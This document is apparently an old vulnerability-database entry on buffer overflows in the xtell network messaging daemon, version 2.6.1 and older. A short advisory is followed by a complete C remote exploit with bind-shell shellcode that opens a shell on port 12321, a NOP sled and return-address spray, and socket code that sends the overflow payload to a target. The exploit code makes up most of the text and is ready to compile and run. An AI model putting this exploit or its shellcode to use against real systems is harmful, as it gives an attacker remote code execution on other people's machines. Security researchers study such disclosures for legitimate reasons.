source: http://www.securityfocus.com/bid/4193/info

xtell is a simple network messaging program. It may be used to transmit terminal messages between users and machines. xtell is available for Linux, BSD and most other Unix based operating systems.

Multiple buffer overflow vulnerabilities have been reported in some versions of xtell. If long strings are recieved by the xtell client, stack memory will be overwritten. Exploitation of these vulnerabilities may result in arbitrary code being executed as the xtell daemon.

Overflow conditions may be caused if long strings are sent by a malicious DNS server in response to the reverse lookup performed when a message is received, either through the auth string returned by the ident server, or through directly sending an overly long message to the vulnerable user.

Earlier versions of xtell may share some or all of these vulnerabilities. This has not been confirmed.

cat >xtelld261.c <<EOF

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>

/*
 *      Remote exploit for Xtelld 2.6.1 and older
 *      Spawns shell on port 12321
 *      Don't forget to set your identd string to 200 characters
 *      Tested against Red Hat 7.2, 7.1; Debian Potato
 *      (c) 2002 Spybreak (spybreak@host.sk)
 */

#define RET     0xbffff5a0

char sc[] =
  "\x55\x89\xe5\x31\xc0\x66\xc7\x45\xf2\x30"
  "\x21\x89\x45\xf4\x89\x45\xf8\x89\x45\xfc"
  "\x89\x45\xe8\xfe\xc0\x89\xc3\x89\x45\xe4"
  "\xfe\xc0\x66\x89\x45\xf0\x89\x45\xe0\xb0"
  "\x66\x8d\x4d\xe0\xcd\x80\x89\x45\xe0\xb0"
  "\x66\xfe\xc3\x8d\x55\xf0\x89\x55\xe4\x31"
  "\xd2\xb2\x42\x80\xea\x32\x89\x55\xe8\x8d"
  "\x4d\xe0\xcd\x80\xb0\x66\xfe\xc3\xfe\xc3"
  "\xfe\xc3\x89\x5d\xe4\xfe\xcb\x8d\x4d\xe0"
  "\xcd\x80\xb0\x66\xfe\xc3\x31\xd2\x89\x55"
  "\xe4\x8d\x4d\xe0\xcd\x80\x89\xd9\x89\xc3"
  "\xfe\xc9\xfe\xc9\xfe\xc9\x31\xc0\xb0\x3f"
  "\xcd\x80\xfe\xc1\xe2\xf4\x51\x68\x6e\x2f"
  "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51"
  "\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x3d\x2c"
  "\x32\xcd\x80";

void
usage (char *exp)
{
  fprintf (stderr, "Remote exploit for xtelld 2.6.1 and older.\n"
           "Spawns shell on port 12321.\n"
           "-- (c) 2002/2 Spybreak --\n"
           "Usage: %s [options] target\n", exp);
  fprintf (stderr, "Options: -a alignment (default 0)\n"
           "         -o offset (default 0)\n"
           "         -p port (default 4224)\n");
  exit (-1);
}

int
main (int argc, char **argv)
{

  int c, s, i, size, port = 4224;
  int ret = RET, alignment = 0;
  struct sockaddr_in target;
  struct hostent *host;
  char payload[1078];

  opterr = 0;

  while ((c = getopt (argc, argv, "a:o:p:")) != -1)
    switch (c)
      {
      case 'a':
        alignment = atoi (optarg);
        break;
      case 'o':
        ret += atoi (optarg);
        break;
      case 'p':
        port = atoi (optarg);
        break;
      default:
        usage (argv[0]);
        exit (1);
      }

  if (!argv[optind])
    {
      puts ("no target!");
      usage (argv[0]);
    }


  printf ("Using: TARGET: %s\tPORT: %d\tADDR: %x\t ALIGN: %d\n",
          argv[optind], port, ret, alignment);

  for (i = 0; i < 540; i++)
    payload[i] = 0x90;

  for (i = 540; i <= 1072; i += 4)
    *((int *) (payload + i)) = ret;


  memcpy (payload + 540, sc, sizeof (sc) - 1);
  memcpy (payload, "01234567890123456789::null:;-)", 30);
  payload[1077 + alignment] = '\n';

  host = gethostbyname (argv[1]);
  if (host == NULL)
    {
      perror ("gethostbyname");
      return (-1);
    }

  s = socket (AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    {
      perror ("socket");
      return (-1);
    }

  target.sin_family = AF_INET;
  target.sin_addr = *((struct in_addr *) host->h_addr);
  target.sin_port = htons (port);

  if (connect (s, (struct sockaddr *) &target, sizeof (target)) == -1)
    {
      perror ("connect");
      close (s);
      return (-1);
    }

  size = send (s, payload + alignment, 1078, 0);
  if (size == -1)
    {
      perror ("send");
      close (s);
      return (-1);
    }

  close (s);
  return (0);
}

EOF

